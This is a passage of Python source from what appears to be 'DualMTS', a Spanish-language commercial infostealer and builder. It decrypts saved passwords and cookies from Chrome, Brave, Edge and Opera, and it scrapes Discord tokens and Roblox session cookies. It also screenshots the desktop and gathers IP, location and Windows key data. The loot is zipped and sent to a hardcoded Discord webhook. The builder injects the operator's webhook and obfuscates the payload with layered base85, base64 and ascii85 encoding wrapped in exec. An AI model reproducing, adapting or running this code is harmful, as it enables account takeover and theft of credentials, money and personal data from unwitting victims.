            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        login = self.temp+self.sep+"Loginvault1.db"

        os.system(f'copy /Y "{login_db}" "{login}" ')
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(
                    encrypted_password, master_key)
                if url != "":
                    f.write(
                        f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        cursor.close()
        conn.close()
        os.remove(login)

    @try_extract
    def grabCookies(self):
        master_key = self.get_master_key(
            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        login = self.temp+self.sep+"Loginvault2.db"
        os.system(f'copy /Y "{login_db}" "{login}" ')
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    f.write(
                        f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                    self.robloxcookies.append(decrypted_cookie)
        cursor.close()
        conn.close()
        os.remove(login)

    def neatifyTokens(self):
        f = open(self.dir+"\\Discord Info.txt",
                 "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = httpx.get(
                self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get(
                "phone") else "No Phone Number attached"
            nitro_data = httpx.get(
                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(
                self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i+'\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir+self.sep+i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        try:
                            os.remove(path)
                        except PermissionError:
                            pass
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(
                            "Thx for use DualMTS\n\n")
                    with open(path, "a", encoding="utf-8") as fp:
                        fp.write(
                            x+"\n\nThx for use DualMTS")
        w = self.getProductValues()
        wname = w[0]
        wkey = w[1]
        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
        # ip, country, city, region, googlemap = "None"
        data = httpx.get("https://ipinfo.io/json").json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        org = data.get('org')
        googlemap = "https://www.google.com/maps/search/google+map++" + \
            data.get('loc')

        _zipfile = os.path.join(
            self.appdata, f'DualInfected-[{os.getlogin()}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"・{f}\n"
        tokens = ''
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} Files Found: "
        embed = {
            'username'
            'avatar_url': 'https://images-ext-2.discordapp.net/external/L9MdZZQJ5eTjrcU_kvhS7USowvRMwJjUg4JcZnfS_Gk/https/media.discordapp.net/attachments/914647494019919872/918977906787618866/kuray2.png',
            'embeds': [
                {
                    'author': {
                        'name': f'*{os.getlogin()}* Nueva victima!',
                        'url': 'https://DualMTS.xyz',
                        'icon_url': 'https://images-ext-2.discordapp.net/external/L9MdZZQJ5eTjrcU_kvhS7USowvRMwJjUg4JcZnfS_Gk/https/media.discordapp.net/attachments/914647494019919872/918977906787618866/kuray2.png'
                    },
                    'color': 0000000,
                    'description': f'[G Maps]({googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''
                                ``IP:᠎{ip}
                                Org:᠎{org}
                                City:᠎{city}
                                Region:᠎{region}
                                Country:᠎{country}``
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''
                                ``PCName:{os.getenv('COMPUTERNAME')}
                                WinKey:᠎{wkey}
                                Platform:᠎{wname}
                                DiskSpace:᠎{disk}GB
                                Ram:{ram}GB``
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**Tokens:**',
                            'value': f'''```yaml
                                {tokens if tokens else "No tokens extracted"}``` 
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': fileCount,
                            'value': f'''```
                                
                                {files_found.strip()}
                                ```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': 'Thx for use DualMTS'
                    }
                }
            ]
        }
        httpx.post(self.webhook, json=embed)
        with open(_zipfile, 'rb') as f:
            httpx.post(self.webhook, files={'upload_file': f})
        os.remove(_zipfile)

if __name__ == "__main__" and os.name == "nt":
    asyncio.run(dualdev().init())

##########################@ 2 PARTEEEE @##############################
import win32crypt
from sqlite3 import connect
from json import loads
from base64 import b64decode
from Cryptodome.Cipher import AES
import os
from shutil import copy2
from requests import post, get
from re import findall

fileCookies = "cooks_"+ os.getlogin()+ ".txt"
filePass = "passes_"+ os.getlogin()+ ".txt"
fileInfo = "info_" + os.getlogin()+ ".txt"

#DISCORD TOKENS
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in findall(regex, line):
                    tokens.append(token)
    f = open(fileInfo, "a")
    f.write(str(tokens))
    f.write("\n")
    f.close()

#DECRYPT CIPHERS
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

#DECRYPT BROWSER
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    

    if os.path.exists(LocalState) == True:
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData) == True:
            copy2(LoginData, "TempMan.db")
            con = connect("TempMan.db")
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            f = open(filePass,"a")
            f.write("***" + name + "***\n")
            f.close()
            for index,logins in enumerate(cur.fetchall()):

                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    initVector = ciphers[3:15]
                    encPass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, initVector)
                    decPass = decrypt_payload(cipher, encPass).decode()
                    toprint = 'URL : {}\nName: {}\nPass: {}\n\n'.format(logins[0], logins[1], decPass)
                    f = open(filePass,"a")
                    f.write(toprint)
                    f.close()
                except:
                    pass
            

            
        else:
            f = open(fileInfo,"a")
            f.write(name + " Login Data file missing\n")
            f.close()
######################################################################
        if os.path.exists(CookiesFile) == True:
            copy2(CookiesFile, "CookMe.db")
            conn = connect("CookMe.db")
            curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            f = open(fileCookies,"a")
            f.write("***" + name + "***\n")
            f.close()
            for index, cookies in enumerate(curr.fetchall()):

                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    initVector = ciphers[3:15]
                    encPass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, initVector)
                    decPass = decrypt_payload(cipher, encPass).decode()
                    toprint = 'URL : {}\nName: {}\nCook: {}\n\n'.format(cookies[0], cookies[1], decPass)
                    l = open(fileCookies,"a")
                    l.write(toprint)
                    l.close()
                except:
                    pass


        else:
            f = open(fileInfo,"a")
            f.write("no " + name + " Cookie file\n")
            f.close()


    else:
        f = open(fileInfo,"a")
        f.write(name + " Local State file missing\n")
        f.close()

#PATH SHIT
def Local_State(path):
    LocalState = path + "\\User Data\\Local State"
    return LocalState

def Login_Data(path):
    LoginData = path + "\\User Data\\Default\\Login Data"
    return LoginData

def Cookies(path):
    Cookies = path + "\\User Data\\Default\\Network\\Cookies"
    return Cookies

if os.path.exists(os.environ['APPDATA'] + "\\Discord") == True:
    find_tokens(os.environ['APPDATA'] + "\\Discord")
if os.path.exists(os.environ['APPDATA'] + "\\discordptb") == True:
    find_tokens(os.environ['APPDATA'] + "\\discordptb")
if os.path.exists(os.environ['APPDATA'] + "\\discordcanary") == True:
    find_tokens(os.environ['APPDATA'] + "\\discordcanary")



#CHROME
pathChrome = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome"

if os.path.exists(pathChrome) == True:
    decrypt_browser(Local_State(pathChrome), Login_Data(pathChrome), Cookies(pathChrome), "Chrome") 
else:
    f = open(fileInfo,"a")
    f.write("Chrome not installed\n")
    f.close()
        


#BRAVE
pathBrave = os.environ['LOCALAPPDATA'] + "\\BraveSoftware\\Brave-Browser"

if os.path.exists(pathBrave) == True:
    decrypt_browser(Local_State(pathBrave), Login_Data(pathBrave), Cookies(pathBrave), "Brave") 
else:
    f = open(fileInfo,"a")
    f.write("Brave not installed\n")
    f.close()



#EDGE
pathEdge = os.environ['LOCALAPPDATA'] + "\\Microsoft\\Edge"

if os.path.exists(pathEdge) == True:
    decrypt_browser(Local_State(pathEdge), Login_Data(pathEdge), Cookies(pathEdge), "Edge") 
else:
    f = open(fileInfo,"a")
    f.write("Edge not installed\n")
    f.close()



#OPERA
pathOpera = os.environ['APPDATA'] + "\\Opera Software\\Opera Stable"

if os.path.exists(pathOpera) == True:
    decrypt_browser(pathOpera + "\\Local State", pathOpera + "\\Login Data", pathOpera + "\\Network\\Cookies", "Opera") 
else:
    f = open(fileInfo,"a")
    f.write("Opera not installed\n")
    f.close()


#OPERAGX
pathOperaGX = os.environ['APPDATA'] + "\\Opera Software\\Opera GX Stable"

if os.path.exists(pathOperaGX) == True:
    decrypt_browser(pathOperaGX + "\\Local State", pathOperaGX + "\\Login Data", pathOperaGX + "\\Cookies", "OperaGX") 
else:
    f = open(fileInfo,"a")
    f.write("OperaGX not installed\n")
    f.close()


###WEBHOOK


def post_to(file):
    token = "TELEGRAM TOKEN"
    chatid = "TELEGRAM CHATID"
    webhookurl = "https://discord.com/api/webhooks/964945318196174898/eUP77ufwpxm0h6z1IO6o9C5DqEpLoGrf23Kt_yDgoSrUO5gwPcAMqItm49y8nWRVTid-"
    #borra "#"  line 222 = telegram api
                                          #line 223 = discord webhook
    #post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chatid}, files={'document': open(file, 'rb')})
    post(webhookurl, files={'files': open(file,'rb')})

if os.path.exists(fileInfo) == True:
    post_to(fileInfo)
    
if os.path.exists(filePass) == True:
    post_to(filePass)
    
if os.path.exists(fileCookies) == True:
    post_to(fileCookies)
###


if os.path.exists(fileInfo) == True:
    os.remove(fileInfo)
if os.path.exists(filePass) == True:
    os.remove(filePass)
if os.path.exists(fileCookies) == True:
    os.remove(fileCookies)

os.remove("TempMan.db")
os.remove("CookMe.db")                  
                                        
                                        """)
                                archivo.close()
                                with open(completeName , 'r') as f:
                                    lines = f.readlines()
                                with open(completeName, 'w') as f2:
                                    for lin in lines:
                                        lin.rstrip()
                                        lin = lin.replace('webhook = ""',  f'webhook = "{webhook}" ')
                                        f2.write("".join(lin))

                                def b85():
                                    text = ""
                                    encode1 = ""
                                    f = open(completeName,'r', encoding="utf8" ,errors="ignore").readlines()
                                    for lineas in f:
                                        text += lineas
                                    text = text.encode()
                                    encode1 = b85encode(text, pad=False)
                                    open(completeName, 'w').write(f"import base64; exec(base64.b85decode({encode1}))")
                                def b64():
                                    text = ""
                                    encode1 = ""
                                    f = open(completeName,'r', encoding="utf8" ,errors="ignore").readlines()
                                    for lineas in f:
                                        text += lineas
                                    text = text.encode()
                                    encode1 = b64encode(text)
                                    open(completeName, 'w').write(f"import base64; exec(base64.b64decode({encode1}))")
                                def a85():
                                    text = ""
                                    encode1 = ""
                                    f = open(completeName,'r', encoding="utf8" ,errors="ignore").readlines()
                                    for lineas in f:
                                        text += lineas
                                    text = text.encode()
                                    encode1 = a85encode(text, pad=False)
                                    open(completeName, 'w').write(f"import base64; exec(base64.a85decode({encode1}))")
                                def encriptadof():
                                    for j in range(3):
                                        j = threading.Thread(target=b85)
                                        j.start()
                                        j.join()
                                    
                                    for j in range(2):
                                        j = threading.Thread(target=b64)
                                        j.start()
                                        j.join()
                                    for j in range(2):
                                        j = threading.Thread(target=a85)
                                        j.start()
                                        j.join()
                                for j in range(3):
                                    j = threading.Thread(target=encriptadof)
                                    j.start()
                                    j.join()
                                destination = os.path.dirname(os.path.realpath(__file__))
                                try:
                                    shutil.copy(completeName, destination)
                                except shutil.SameFileError:
                                    pass
                                try:
                                    os.remove(completeName)
                                except:
                                    pass
                                print(f"\n{fo.GREEN}[+] {fo.WHITE}DualMTS_VIP.py Generado , Guardado como DualMTS_VIP.py , Disfruta :) !!!!")
                                sleep(5)
                            except KeyboardInterrupt:
                                keybp()
                        else:
                            print(f"{fo.GREEN}[+] {fo.WHITE}Key no Reconocida, Compra una en https://shoppy.gg/@Portu (Contacta a Portu#0022 / suleymansha#8496) ")
                            sleep(3)
                    except KeyboardInterrupt:
                        keybp()
                elif preg.lower() == str("troll"):
                    try:
                        hwid()
                        print(f"""{Fore.GREEN}
|==================================================|
| Mantenimiento                                    |
|==================================================|
                        """)
                        sleep(5)
                    except KeyboardInterrupt:
                        keybp()
                elif preg.lower() == str("upt"):
                    try:
                        update()
                    except KeyboardInterrupt:
                        keybp()
                else:
                    print(f"\n{fo.GREEN}[+] {fo.WHITE}Opción no encontrada, prueba denuevo\n")
                    sleep(2)
                    main()
            except KeyboardInterrupt:
                keybp()
    except KeyboardInterrupt:
        keybp()

main()